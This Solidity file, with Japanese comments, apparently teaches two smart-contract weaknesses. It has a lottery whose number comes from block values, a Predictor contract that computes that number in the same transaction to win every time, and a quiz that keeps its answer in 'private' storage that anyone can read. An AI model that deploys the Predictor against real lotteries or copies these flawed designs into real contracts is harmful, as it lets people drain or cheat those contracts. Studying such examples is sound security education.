// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// ブロックの値から 0〜9 の当たり番号を作る抽選。
// 外れた番号で play を呼ぶと取り消される（revert）。
contract Lottery {
    mapping(address => uint256) public winsOf;

    function draw(address player) public view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.prevrandao, block.timestamp, player))) % 10;
    }

    function play(uint256 guess) external {
        require(guess == draw(msg.sender), "miss");
        winsOf[msg.sender] += 1;
    }
}

// 同じトランザクションの中で当たり番号を計算してから play を呼ぶ。
contract Predictor {
    function attack(Lottery lottery) external {
        lottery.play(lottery.draw(address(this)));
    }
}

// 正解の言葉を private の変数に置いたクイズ。
contract Quiz {
    address public owner;          // slot 0
    string private answer;         // slot 1
    uint256 public solved;         // slot 2

    constructor(string memory _answer) {
        owner = msg.sender;
        answer = _answer;
    }

    function solve(string calldata word) external {
        require(keccak256(bytes(word)) == keccak256(bytes(answer)), "wrong");
        solved += 1;
    }

    function setAnswer(string calldata _answer) external {
        require(msg.sender == owner, "not owner");
        answer = _answer;
    }
}
